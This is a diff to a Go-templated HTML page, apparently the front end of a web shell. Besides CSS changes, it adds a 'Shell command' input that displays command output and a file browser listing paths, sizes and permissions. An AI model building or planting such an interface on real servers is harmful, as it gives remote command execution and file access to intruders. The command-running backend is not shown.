@@ -26,9 +26,44 @@
             }
         }
 
-        body {
+        body,
+        input,
+        textarea {
             background-color: black;
+        }
+
+        body,
+        input,
+        textarea,
+        .path a {
             color: white;
+        }
+
+        a,
+        a:hover,
+        a:active {
+            text-decoration: none;
+        }
+
+        textarea,
+        .path input,
+        .cmd input,
+        .files {
+            width: 100%;
+        }
+
+        header,
+        .path {
+            display: flex;
+        }
+
+        input,
+        .output,
+        .path a {
+            border: 1px solid aqua;
+        }
+
+        body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, Fira, Sans, "Droid Sans", "Helvetica Neue", sans-serif;
         }
 
@@ -37,44 +72,29 @@
             font-weight: 700;
         }
 
-        header {
-            display: flex;
-        }
-
         hr {
             border-color: aqua;
         }
 
-        input {
-            background-color: black;
-            color: white;
-            border: 1px solid aqua;
+        .cmd {
+            margin-bottom: 25px;
         }
 
-        .path input {
-            width: 100%;
+        .output {
+            margin-bottom: 0;
+            padding: 20px;
         }
 
-        .path button {
-            display: none;
+        .path a {
+            padding: 1px 5px;
         }
 
         textarea {
-            width: 100%;
             height: 400px;
-            background-color: black;
-            color: white;
         }
 
         .files {
-            width: 100%;
             border-collapse: collapse;
-        }
-
-        .files a,
-        .files a:hover,
-        .files a:active {
-            text-decoration: none;
         }
 
         .files tr {
@@ -149,23 +169,47 @@ SSS~YSSY      YSSP~YSSY         S*S       YSS'    SSS    S*S    YSSP    YSSP    
             </pre>
     </header>
     <main>
+        <div class="cmd">
+            {{ if ne .CmdOutput "" }}
+            <pre class="output">{{ .CmdOutput }}</pre>
+            {{ end }}
+            <form method="get" class="cmd">
+                <input name="cmd" placeholder="Shell command" />
+            </form>
+        </div>
+        {{ $fileInfo := .File.FileInfo }}
         <form method="get" class="path">
-            <input name="path" value="{{ .File.Path }}" />
-            <button type="submit">OK</button>
+            <a href="?path={{ .File.Back }}">&larr;</a>
+            <input name="path" value="{{ $fileInfo.Path }}" />
         </form>
-        {{ if .File.IsDir }}
-        {{ $path := .File.Path }}
+        {{ if $fileInfo.IsDir }}
         <table class="files">
             <thead>
                 <tr>
                     <td>Name</td>
+                    <td>Size</td>
+                    <td>Modify</td>
+                    <td>Permissions</td>
                 </tr>
             </thead>
             <tbody>
                 {{ range $index, $file := .File.Files }}
                 <tr>
                     <td>
-                        <a href="?path={{ $path }}\{{ $file | urlquery }}" class="color">{{ $file }}</a>
+                        <a href="?path={{ $file.Path }}" class="color">{{ $file.Name }}</a>
+                    </td>
+                    <td>
+                        {{ if $file.IsDir }}
+                        DIR
+                        {{ else }}
+                        {{ $file.Size }}
+                        {{ end }}
+                    </td>
+                    <td>
+                        {{ $file.ModTime }}
+                    </td>
+                    <td>
+                        {{ $file.Perm }}
                     </td>
                 </tr>
                 {{ end }}
